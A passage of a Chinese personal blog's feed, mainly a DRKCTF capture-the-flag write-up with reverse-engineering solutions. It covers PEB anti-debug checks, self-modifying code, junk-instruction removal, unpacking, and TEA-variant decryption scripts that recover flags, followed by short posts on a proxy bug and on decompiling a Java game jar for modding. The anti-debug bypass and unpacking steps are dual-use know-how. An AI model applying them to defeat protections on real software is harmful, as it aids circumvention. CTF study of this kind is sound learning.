<span class="number">0xff</span>, <span class="number">0xef</span>, <span class="number">0x79</span>, <span class="number">0xbc</span>, <span class="number">0xda</span>, <span class="number">0x6c</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0xb1</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5d</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x15</span>, <span class="number">0xc1</span>, <span class="number">0x1b</span>, <span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x5a</span>, <span class="number">0x9f</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x9d</span>, <span class="number">0x44</span>, <span class="number">0x0d</span>, <span class="number">0x56</span>, <span class="number">0xfd</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x7e</span>, <span class="number">0x34</span>, <span class="number">0x5a</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x24</span>, <span class="number">0xbc</span>, <span class="number">0xe1</span>, <span class="number">0x40</span>, <span class="number">0x0d</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x68</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0x09</span>, <span class="number">0x5b</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0xb6</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x0a</span>, <span class="number">0x5e</span>, <span class="number">0xd9</span>, <span class="number">0x03</span>, <span class="number">0xb2</span>, <span class="number">0x48</span> &#125;<span class="comment">;</span></span><br><span class="line">for (<span class="keyword">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 61; ++i) &#123;</span></span><br><span class="line">fakefalg[i] ^= <span class="number">0x23</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">uint32_t key[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;<span class="comment">;</span></span><br><span class="line">btea((unsigned*)(fakefalg + <span class="number">1</span>), -<span class="number">15</span>, key)<span class="comment">;</span></span><br><span class="line">printf(<span class="string">&quot;解密后的数据：%s\n&quot;</span>, (char*)fakefalg)<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到假flag：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>o<span class="number">_m</span>ore<span class="number">_f</span>lower<span class="number">_</span>tea.Please<span class="number">_</span><span class="keyword">try</span><span class="number">_</span>again!!&#125;</span><br></pre></td></tr></table></figure><p>很明显，这个不是真flag，这说明：<br>动态调试的时候和正常的时候运行的逻辑不一样<br>第一时间会想到这个可能是smc或者hook<br>所以先查看encode的交叉引用。<br>于是找到这个函数：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png#averageHue=%23262523&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ue3859d07&amp;originHeight=175&amp;originWidth=342&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=13519&amp;status=done&amp;style=none&amp;taskId=u3580044d-d353-4778-a37c-19359f8ce4a&amp;title=" alt="image.png"><br>可以看到上层函数<br>修改了encode中的前几个字节用ret的方法返回到sub_140012A0中<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png#averageHue=%23212120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uc3c9f92e&amp;originHeight=449&amp;originWidth=1207&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=33860&amp;status=done&amp;style=none&amp;taskId=uf9eb6404-6a25-4a29-80c0-ffd3c2e2565&amp;title=" alt="image.png"><br>这里的第一个是反调试，在x64下，调试标志位在PEB表偏移0x2的位置，通过获取gs寄存器找到peb表的位置：<br>readsqword(0x62)得到调试标志位并判断当前进程是否在调试<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png#averageHue=%23232222&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u7808a012&amp;originHeight=180&amp;originWidth=741&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9782&amp;status=done&amp;style=none&amp;taskId=ud6d90f24-7c4d-416e-a406-ac032578606&amp;title=" alt="image.png"><br>block是单纯地得到对应的两个函数地址<br>get_virtual_protect中，通过异或把virtualprotect函数名隐藏并通过搜索它在kernel32.dll中位置返回函数地址<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png#averageHue=%23232221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ud99782d9&amp;originHeight=483&amp;originWidth=557&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29585&amp;status=done&amp;style=none&amp;taskId=u93815ed8-e441-450f-b0cc-314164f4205&amp;title=" alt="image.png"><br>通过上面的分析，可以得出我们需要查看sub_140012A0的内容，这里才是真正的加密函数<br>打开，还是花QAQ<br>汇编中，可以看到函数后段全是一个指令+一个jmp<br>由于汇编不是很好看，改成流程图看奇怪的地方。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png#averageHue=%23343436&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u120b6f3f&amp;originHeight=899&amp;originWidth=326&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9261&amp;status=done&amp;style=none&amp;taskId=u70f5eff6-e16f-4590-91c9-49d7be337ea&amp;title=" alt="image.png"><br>可以猜测：如果一个地方有一块代码，并且有连续jmp，这里可能是人工加的花<br>那么就先看一下那个很远的环和上面一排没有入口的块<br>1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png#averageHue=%23212120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u0fa192bf&amp;originHeight=821&amp;originWidth=634&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53017&amp;status=done&amp;style=none&amp;taskId=u0aa49f92-479d-4bac-b428-67c7d183fb5&amp;title=" alt="image.png"><br>这里能看到push和pop，所以从push进入花，从pop离开花，可以看出可以这样还原<br>2<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png#averageHue=%23242322&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u065c3468&amp;originHeight=933&amp;originWidth=1035&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=123404&amp;status=done&amp;style=none&amp;taskId=u110b76e5-e698-4870-9616-0dac6ca2b32&amp;title=" alt="image.png"><br>这里有一个call，尝试跟着call走，它下一步修改了返回地址，减去5A<br>即：140001460<br>转换一下这里的指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png#averageHue=%23282726&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u50bfb4ab&amp;originHeight=50&amp;originWidth=338&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=2785&amp;status=done&amp;style=none&amp;taskId=ueb56bbeb-3453-4f58-b939-3e8e83aa1b3&amp;title=" alt="image.png"><br>所以把call nop了就好<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png#averageHue=%23535739&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ue655d849&amp;originHeight=215&amp;originWidth=428&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=3787&amp;status=done&amp;style=none&amp;taskId=u28dc4c33-1a0b-4666-82b4-37908298542&amp;title=" alt="image.png"><br>3<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png#averageHue=%23232221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u9a6a4d18&amp;originHeight=270&amp;originWidth=476&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=12030&amp;status=done&amp;style=none&amp;taskId=u6996037f-ff56-4fac-9424-57aa1df09f5&amp;title=" alt="image.png"><br>nop之后<br>然后全部u，c，p还原函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ua1b08400&amp;originHeight=941&amp;originWidth=1251&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=66758&amp;status=done&amp;style=none&amp;taskId=ud999defe-5b98-4c43-b6af-623c89dd5f4&amp;title=" alt="image.png"><br>这里又可以看到上面的一个奇怪return，看汇编可以发现还是一个花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png#averageHue=%23272221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uad94fd86&amp;originHeight=387&amp;originWidth=835&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=28232&amp;status=done&amp;style=none&amp;taskId=uddf8219b-4679-4003-a0a0-f0876da42bd&amp;title=" alt="image.png"><br>直接把call到retn去掉（除了shl）<br>这是一个变体tea，尝试化简这个函数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uc65b387a&amp;originHeight=910&amp;originWidth=974&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=89317&amp;status=done&amp;style=none&amp;taskId=uc8d53d53-53c1-44c7-af9e-dc9500873e0&amp;title=" alt="image.png"><br>写脚本直接解<br>exp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dectrueTEA</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">uint32_t</span>* key, <span class="type">uint32_t</span> E)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> delta[<span class="number">4</span>] = &#123; <span class="number">0x59578627</span> ,<span class="number">0xe1c49e72</span>,<span class="number">0xbc24167f</span> ,<span class="number">0x8c3da26b</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> e = E;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> len = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint32_t</span>* c[<span class="number">4</span>] = &#123; &amp;flag[(len - (i + <span class="number">3</span>)) % len],&amp;flag[(len - (i + <span class="number">2</span>)) % len],&amp;flag[(len - (i + <span class="number">1</span>)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">32</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">*c[<span class="number">3</span>] -= ((e ^ *c[<span class="number">2</span>]) ^ (key[(j + <span class="number">3</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">2</span>)) ^ (e &lt;&lt; <span class="number">1</span>);</span><br><span class="line">e -= delta[*c[<span class="number">3</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">2</span>] -= ((e ^ *c[<span class="number">1</span>]) ^ (key[(j + <span class="number">2</span>) % <span class="number">4</span>] &lt;&lt; <span class="number">3</span>)) ^ (e &gt;&gt; <span class="number">2</span>);</span><br><span class="line">e -= delta[*c[<span class="number">2</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">1</span>] -= ((e ^ *c[<span class="number">0</span>]) ^ (key[(j + <span class="number">1</span>) % <span class="number">4</span>] &gt;&gt; <span class="number">1</span>)) ^ (e &lt;&lt; <span class="number">4</span>);</span><br><span class="line">e -= delta[*c[<span class="number">1</span>] % <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">*c[<span class="number">0</span>] -= ((e ^ *c[<span class="number">3</span>]) ^ (key[j % <span class="number">4</span>] &lt;&lt; <span class="number">2</span>)) ^ (e &gt;&gt; <span class="number">3</span>);</span><br><span class="line">e -= delta[*c[<span class="number">0</span>] % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> E = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> k1[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;;</span><br><span class="line"><span class="type">uint32_t</span> a[] = &#123; <span class="number">0x127DC4E1</span>, <span class="number">0xCBA0EC0E</span>, <span class="number">0x570EDF5B</span>, <span class="number">0x99062A35</span>, <span class="number">0x382A7E1B</span>, <span class="number">0x15E46742</span>, <span class="number">0x4E5E456F</span>, <span class="number">0x3834C1D6</span>, <span class="number">0x5EF778A5</span>, <span class="number">0xAF217212</span>, <span class="number">0xC2D79D20</span>, <span class="number">0xD5C5935F</span>, <span class="number">0xCD2F5BB</span>, <span class="number">0xC527398C</span>, <span class="number">0x5EAC6739</span> &#125;;</span><br><span class="line">E = <span class="number">0xAE58570C</span>;</span><br><span class="line"><span class="built_in">dectrueTEA</span>(a, k1, E);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""></h3><h3 id="Debug">Debug</h3><p>die看不出来壳，但是ida可以，所以用x64dbg到脱完壳的地方，</p><p>不过得先调试，结果用ida调试直接寄在tls的call rax里面，用x64dbg一点事都没有，百思不得其解，最后发现</p><p><img src="https://s2.loli.net/2024/05/29/lfk2bu7oR6UGThp.png" alt="image-20240529215820329"></p><p>tls里面有个反调试，在解壳之前，所以得先跳过，dbg里面自带的插件直接秒了，所以dbg就没事QAQ</p><p>这个感觉很不错，要是有办法在ida里面用就好了</p><p>记录一下用工具修复iat表的过程：</p><p>x64dbg 插件 scylla</p><p><img src="https://s2.loli.net/2024/05/29/Q8fl1qEwGeXRmZx.png" alt="image-20240529205550754"></p><p>去反调试，然后把smc搞出来，直接解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = [<span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0xD2</span>, <span class="number">0x43</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0xC0</span>, <span class="number">0x83</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xCD</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0xC8</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x9F</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x98</span>, <span class="number">0x42</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x46</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>,<span class="number">0xE</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        k = c</span><br><span class="line">        <span class="keyword">if</span> c &lt;=<span class="number">0x40</span> <span class="keyword">or</span> c&gt;=<span class="number">0x5b</span>:</span><br><span class="line">            <span class="keyword">if</span> c&lt;=<span class="number">0x60</span> <span class="keyword">or</span> c &gt;= <span class="number">0x7b</span>:</span><br><span class="line">                c-=<span class="number">30</span></span><br><span class="line">                c^=<span class="number">0x51</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c-=<span class="number">32</span></span><br><span class="line">                c^=<span class="number">0xcd</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c+=<span class="number">32</span></span><br><span class="line">            c^=<span class="number">0xab</span></span><br><span class="line">        <span class="keyword">if</span> c==last[<span class="built_in">len</span>]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#DRKCTF&#123;Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一起做杯下午茶吧">一起做杯下午茶吧</h3><p>不会QAQ</p><h2 id="Osint">Osint</h2><h3 id="羡慕群友每一天">羡慕群友每一天</h3><p>直接开搜</p><p><img src="https://s2.loli.net/2024/05/27/D9qgF3a4ZLxtCvP.png" alt="image-20240527145103522"></p><p>发现不是中间圆心的位置好像不一样</p><p>找另一个</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-弗罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗⾥达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密州-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DRKCTF</span><span class="template-variable">&#123;美国-佛罗里达州-迈阿密市-Skyviews&#125;</span></span><br></pre></td></tr></table></figure><p>第五个是对的</p><h2 id="Misc">Misc</h2><h3 id="DNA-5">DNA -5</h3><p>提示：遥遥领先</p><p>抽象的题，没看wp之前我绝对想不到QAQ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACGCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCAGCTAAATCCAATAACCACTACCCCTCCATAAGAGAATAACCACTCATCCCCCTAATAAGAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>根据wp，由遥遥领先想到5G，又因为-5，所以可以想到要少5个G</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACCCCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC</span></span><br></pre></td></tr></table></figure><p>看这个可以先试试DNA解密</p><p>不行</p><p>结果是摩斯</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WIPXGU<span class="meta">%</span>u<span class="number">7</span>bSZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span><span class="meta">%</span>u<span class="number">7</span>d</span><br><span class="line">WIPXGU&#123;SZ_SZ_<span class="number">1</span><span class="name">G5</span>_<span class="symbol">N0</span>IH<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><p>然后解atbash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;H<span class="built_in">A_HA</span>_1T5_M0RS3&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">DRKCTF的复现</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="cry" scheme="https://www.pri87.vip/tags/cry/"/>
    
  </entry>
  
  <entry>
    <title>记录一次修正网络bug</title>
    <link href="https://www.pri87.vip/posts/5afbca6a.html"/>
    <id>https://www.pri87.vip/posts/5afbca6a.html</id>
    <published>2024-05-27T02:52:37.000Z</published>
    <updated>2024-06-17T16:20:30.399Z</updated>
    
    <content type="html"><![CDATA[<p>不知道是什么时候开始，我的梯子出了一个bug（我感觉是安了idea破解插件之后QAQ）</p><p>首先这是基本信息：</p><p>我有一个梯子（同一个品牌）</p><p>一个是edge浏览器插件</p><p>一个是软件</p><p>根据这几天的观察，出现了以下现象：</p><ul><li>开启插件而关闭软件（上网策略+全局代理）：<br>只能进入cn.bing.com且网速很慢</li><li>开启插件而关闭软件（全局代理）：<br>网页浏览恢复正常，<a href="http://xn--www-u28d42be8rwr7i.bing.com">可以连上www.bing.com</a>，过一段时间变成不可以连上，并且修打开关闭上网策略都不行</li><li>开启软件而关闭插件（全局代理）：<br>网页浏览恢复正常，<a href="http://xn--www-u28d42be8rwr7i.bing.com">可以连上www.bing.com</a></li><li>两个都开启：<br>只能进入cn.bing.com且网速很慢</li><li>以前开启插件而关闭软件（上网策略+全局代理）：<br><a href="http://xn--www-u28d42be8rwr7i.bing.com">可以连上www.bing.com</a></li><li>bing会解析ip判断是连cn还是www</li><li>有的时候通过pip安装包会访问错误（国内源）但是开启软件就可以</li></ul><p><a href="http://xn--www-u28dl7mmcy3fmz7gul0aghdvypmtle27cgian7ax59d.bing.com">目前通过关闭上网策略来进入www.bing.com</a><br>外面的bug之后再修QAQ</p><p>看了一下设置：<br>上网策略中会把cn.bing.com直接连接不经过梯子</p>]]></content>
    
    
    <summary type="html">好怪啊，这是为什么呢</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>java逆向基本步骤</title>
    <link href="https://www.pri87.vip/posts/c2aa3be6.html"/>
    <id>https://www.pri87.vip/posts/c2aa3be6.html</id>
    <published>2024-05-19T12:35:58.000Z</published>
    <updated>2024-06-17T16:20:30.387Z</updated>
    
    <content type="html"><![CDATA[<p>今天玩杀戮尖塔，好玩，所以试了一下要怎么逆。</p><p>这个游戏是java写的，所以基本逻辑就是先把jar包反编译成java源文件，然后修改，然后用idea生成出jar包</p><p>这篇只是记录一下基本步骤：</p><p>1.反编译jar</p><p>这里使用的是idea的java-decompiler插件。</p><p>下载好之后找到java-decompiler插件的位置。</p><p>先生成一个文件夹，假设名字是test</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;C:\decompiler.jar&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true target<span class="selector-class">.jar</span> test</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;decomiler路径&quot;</span> org<span class="selector-class">.jetbrains</span><span class="selector-class">.java</span><span class="selector-class">.decompiler</span><span class="selector-class">.main</span><span class="selector-class">.decompiler</span><span class="selector-class">.ConsoleDecompiler</span> -dgs=true 源jar路径 一个文件夹名</span><br></pre></td></tr></table></figure><p>如果正确，文件夹里会生成一个和刚刚同名的jar。解压之后得到源代码。</p><p>2.调整目录结构</p><p>由于解压后所有内容都是平铺的，需要调整目录结构让idea可以正确识别并生成，同时由于我逆的是游戏模组，所以还需要导入对应的游戏依赖包。</p><p>目录结构应该是：</p><p>test</p><ul><li>src<ul><li>main<ul><li>java<ul><li>源代码</li></ul></li><li>resources<ul><li>img</li><li>localization</li></ul></li></ul></li></ul></li></ul><p>生成jar</p><p>不是很懂maven，好像是一个管理器一样的东西，这个地方我用它来生成jar代码</p><p>详见：<a href="https://zhuanlan.zhihu.com/p/403468512">杀戮尖塔MOD制作详解</a></p><p>首先构建pom.xml</p><p>在里面填写对应的配置项</p><p>然后在右边选择package</p><p>它会自动生成，如果反编译的文件有问题，就手动修正一下（我只遇到了一个）</p><p>然后就能生成对应的jar文件了。</p><hr><p>一定要注意文件路径要正确，不然只能生成只有元数据的文件。</p>]]></content>
    
    
    <summary type="html">ss快玩！</summary>
    
    
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="java" scheme="https://www.pri87.vip/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>seh-windows结构化异常处理研究</title>
    <link href="https://www.pri87.vip/posts/8c61c980.html"/>
    <id>https://www.pri87.vip/posts/8c61c980.html</id>
    <published>2024-05-04T10:01:24.000Z</published>
    <updated>2024-06-17T16:20:30.397Z</updated>
    
